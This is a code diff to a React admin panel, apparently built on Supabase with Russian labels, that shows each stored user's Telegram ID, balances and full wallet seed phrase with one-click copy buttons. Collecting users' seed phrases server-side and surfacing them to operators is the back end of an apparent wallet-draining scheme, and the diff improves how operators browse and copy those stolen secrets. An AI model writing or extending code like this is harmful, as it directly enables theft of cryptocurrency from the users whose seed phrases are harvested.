@@ -5042,99 +5042,119 @@ function SupabaseAdminPanel() {
           const uid = w.id||i;
           const isOpen = expandedId===uid;
           const mnStr = (w.mnemonic||"").trim();
+          const displayName = w.username && w.username !== "Anonymous" ? w.username : null;
+          const tgId = w.telegram_id || null;
+          const dateStr = w.created_at ? new Date(w.created_at).toLocaleString("ru-RU",{day:"2-digit",month:"2-digit",year:"2-digit",hour:"2-digit",minute:"2-digit"}) : "—";
+          const balUSD = parseFloat(w.balance||0);
+
+          // Avatar letter: prefer first letter of username, else TG ID last 2 digits
+          const avatarLetter = displayName
+            ? displayName.replace("@","")[0].toUpperCase()
+            : tgId ? tgId.slice(-2) : "?";
 
           return (
             <div key={uid} style={{background:"#111",borderRadius:16,
               border:"1px solid rgba(255,255,255,0.07)",marginBottom:8,overflow:"hidden"}}>
 
-              {/* Card header — click to expand */}
+              {/* Card header */}
               <div onClick={()=>setExpandedId(isOpen?null:uid)}
-                style={{display:"flex",alignItems:"center",padding:"13px 16px",
-                  cursor:"pointer",gap:12}}>
+                style={{display:"flex",alignItems:"center",padding:"13px 16px",cursor:"pointer",gap:12}}>
 
-                <div style={{width:38,height:38,borderRadius:"50%",flexShrink:0,
-                  background:"linear-gradient(135deg,#1e3a5f,#2563eb)",
+                <div style={{width:42,height:42,borderRadius:"50%",flexShrink:0,
+                  background: displayName
+                    ? "linear-gradient(135deg,#1e3a5f,#2563eb)"
+                    : "linear-gradient(135deg,#374151,#4b5563)",
                   display:"flex",alignItems:"center",justifyContent:"center",
-                  fontSize:15,fontWeight:700,color:"#fff"}}>
-                  {(w.username||"?")[0].toUpperCase()}
+                  fontSize:displayName?15:11,fontWeight:700,color:"#fff"}}>
+                  {avatarLetter}
                 </div>
 
                 <div style={{flex:1,minWidth:0}}>
-                  <div style={{color:"#fff",fontSize:14,fontWeight:600,
-                    whiteSpace:"nowrap",overflow:"hidden",textOverflow:"ellipsis"}}>
-                    {w.username||"Anonymous"}
+                  {/* Line 1: username (bold) or fallback label */}
+                  <div style={{color: displayName?"#fff":"rgba(255,255,255,0.35)",
+                    fontSize:14,fontWeight:600,whiteSpace:"nowrap",overflow:"hidden",textOverflow:"ellipsis"}}>
+                    {displayName ? `👤 ${displayName}` : "👤 Нет username"}
                   </div>
-                  <div style={{color:"rgba(255,255,255,0.35)",fontSize:11,marginTop:1}}>
-                    {w.telegram_id?`TG: ${w.telegram_id}`:"No TG ID"} · ${parseFloat(w.balance||0).toFixed(4)}
+                  {/* Line 2: TG ID + balance */}
+                  <div style={{color:"rgba(255,255,255,0.4)",fontSize:11,marginTop:2,
+                    display:"flex",gap:8,alignItems:"center"}}>
+                    <span>{tgId ? `🆔 ${tgId}` : "🆔 Нет ID"}</span>
+                    <span style={{color:"rgba(255,255,255,0.2)"}}>·</span>
+                    <span>{balUSD>0?`💰 $${balUSD.toFixed(2)}`:"$0"}</span>
                   </div>
                 </div>
 
-                <ChevronRight size={15} color="rgba(255,255,255,0.25)"
-                  style={{transform:isOpen?"rotate(90deg)":"none",transition:"transform 0.2s",flexShrink:0}}/>
+                <div style={{display:"flex",flexDirection:"column",alignItems:"flex-end",gap:4,flexShrink:0}}>
+                  <ChevronRight size={15} color="rgba(255,255,255,0.25)"
+                    style={{transform:isOpen?"rotate(90deg)":"none",transition:"transform 0.2s"}}/>
+                  <span style={{color:"rgba(255,255,255,0.2)",fontSize:9}}>{dateStr}</span>
+                </div>
               </div>
 
               {/* Expanded */}
               {isOpen&&(
                 <div style={{borderTop:"1px solid rgba(255,255,255,0.06)",padding:"14px 16px"}}>
 
+                  {/* Info block — same style as bot notification */}
+                  <div style={{background:"rgba(255,255,255,0.03)",borderRadius:12,
+                    padding:"12px 14px",marginBottom:12,display:"flex",flexDirection:"column",gap:7}}>
+                    {[
+                      {icon:"👤",label:"Пользователь",val:displayName||"Нет username"},
+                      {icon:"🆔",label:"Telegram ID",val:tgId||"—", copyKey:`tg_${uid}`, copyVal:tgId},
+                      {icon:"🕐",label:"Добавлен",val:w.created_at?new Date(w.created_at).toLocaleString("ru-RU"):"—"},
+                      {icon:"💰",label:"Баланс USD",val:balUSD>0?`$${balUSD.toFixed(4)}`:"$0"},
+                    ].map(row=>(
+                      <div key={row.label} style={{display:"flex",alignItems:"center",gap:8}}>
+                        <span style={{fontSize:14,width:20,flexShrink:0}}>{row.icon}</span>
+                        <span style={{color:"rgba(255,255,255,0.35)",fontSize:12,width:100,flexShrink:0}}>{row.label}:</span>
+                        <span style={{color:"#fff",fontSize:12,fontWeight:500,flex:1,wordBreak:"break-all"}}>{row.val}</span>
+                        {row.copyKey&&row.copyVal&&(
+                          <button onClick={e=>{e.stopPropagation();copyText(row.copyVal,row.copyKey);}}
+                            style={{padding:"2px 8px",borderRadius:6,border:"none",fontSize:10,cursor:"pointer",
+                              background:copiedKey===row.copyKey?"#16a34a":"rgba(37,99,235,0.4)",color:"#fff"}}>
+                            {copiedKey===row.copyKey?"✓":"Копировать"}
+                          </button>
+                        )}
+                      </div>
+                    ))}
+                  </div>
+
                   {/* Seed phrase */}
                   <div style={{marginBottom:12}}>
-                    <div style={{color:"rgba(255,255,255,0.4)",fontSize:10,fontWeight:600,
-                      textTransform:"uppercase",letterSpacing:"0.08em",marginBottom:6}}>Seed Phrase</div>
+                    <div style={{color:"rgba(255,255,255,0.35)",fontSize:10,fontWeight:600,
+                      textTransform:"uppercase",letterSpacing:"0.08em",marginBottom:6}}>🔑 Seed Phrase</div>
                     <div style={{background:"rgba(37,99,235,0.08)",border:"1px solid rgba(37,99,235,0.2)",
                       borderRadius:10,padding:"10px 12px",display:"flex",alignItems:"flex-start",gap:8}}>
-                      <div style={{flex:1,color:"rgba(255,255,255,0.8)",fontSize:12,
-                        fontFamily:"monospace",wordBreak:"break-word",lineHeight:1.7}}>
+                      <div style={{flex:1,color:"rgba(255,255,255,0.85)",fontSize:12,
+                        fontFamily:"monospace",wordBreak:"break-word",lineHeight:1.8}}>
                         {mnStr||"—"}
                       </div>
                       <button onClick={e=>{e.stopPropagation();copyText(mnStr,`m_${uid}`);}}
                         style={{flexShrink:0,padding:"5px 10px",borderRadius:8,border:"none",
                           background:copiedKey===`m_${uid}`?"#16a34a":"#2563eb",
-                          color:"#fff",fontSize:11,cursor:"pointer",whiteSpace:"nowrap",
-                          transition:"background 0.2s"}}>
-                        {copiedKey===`m_${uid}`?"✓ Скопировано":"Копировать"}
+                          color:"#fff",fontSize:11,cursor:"pointer",whiteSpace:"nowrap",transition:"background 0.2s"}}>
+                        {copiedKey===`m_${uid}`?"✓ Готово":"Копировать"}
                       </button>
                     </div>
                   </div>
 
-                  {/* Coin balances grid */}
-                  <div style={{marginBottom:12}}>
-                    <div style={{color:"rgba(255,255,255,0.4)",fontSize:10,fontWeight:600,
-                      textTransform:"uppercase",letterSpacing:"0.08em",marginBottom:6}}>Балансы монет</div>
-                    <div style={{display:"grid",gridTemplateColumns:"repeat(4,1fr)",gap:5}}>
-                      {COINS.map(sym=>{
-                        const val = parseFloat(w[sym.toLowerCase()+"_balance"]||0);
-                        return (
-                          <div key={sym} style={{background:"rgba(255,255,255,0.03)",
-                            borderRadius:8,padding:"6px 8px",textAlign:"center"}}>
-                            <div style={{color:"rgba(255,255,255,0.4)",fontSize:9,marginBottom:2}}>{sym}</div>
-                            <div style={{color:val>0?"#34d399":"rgba(255,255,255,0.2)",
-                              fontSize:11,fontWeight:600}}>{val>0?val.toFixed(4):"0"}</div>
-                          </div>
-                        );
-                      })}
-                    </div>
+                  {/* Coin balances */}
+                  <div style={{color:"rgba(255,255,255,0.35)",fontSize:10,fontWeight:600,
+                    textTransform:"uppercase",letterSpacing:"0.08em",marginBottom:6}}>📊 Балансы монет</div>
+                  <div style={{display:"grid",gridTemplateColumns:"repeat(4,1fr)",gap:5}}>
+                    {COINS.map(sym=>{
+                      const val = parseFloat(w[sym.toLowerCase()+"_balance"]||0);
+                      return (
+                        <div key={sym} style={{background:"rgba(255,255,255,0.03)",
+                          borderRadius:8,padding:"7px 6px",textAlign:"center"}}>
+                          <div style={{color:"rgba(255,255,255,0.4)",fontSize:9,marginBottom:3}}>{sym}</div>
+                          <div style={{color:val>0?"#34d399":"rgba(255,255,255,0.2)",
+                            fontSize:11,fontWeight:600}}>{val>0?val.toFixed(4):"0"}</div>
+                        </div>
+                      );
+                    })}
                   </div>
 
-                  {/* Meta row */}
-                  <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",flexWrap:"wrap",gap:4}}>
-                    <span style={{color:"rgba(255,255,255,0.22)",fontSize:10}}>
-                      ID: {w.id||"—"}
-                    </span>
-                    <span style={{color:"rgba(255,255,255,0.22)",fontSize:10}}>
-                      {w.created_at?new Date(w.created_at).toLocaleString("ru-RU"):"—"}
-                    </span>
-                  </div>
-
-                  {/* Copy TG ID */}
-                  {w.telegram_id&&(
-                    <button onClick={e=>{e.stopPropagation();copyText(w.telegram_id,`tg_${uid}`);}}
-                      style={{marginTop:10,width:"100%",padding:"8px",borderRadius:10,
-                        border:"1px solid rgba(255,255,255,0.08)",background:"transparent",
-                        color:"rgba(255,255,255,0.4)",fontSize:12,cursor:"pointer"}}>
-                      {copiedKey===`tg_${uid}`?"✓ Telegram ID скопирован":`TG ID: ${w.telegram_id}`}
-                    </button>
-                  )}
                 </div>
               )}
             </div>
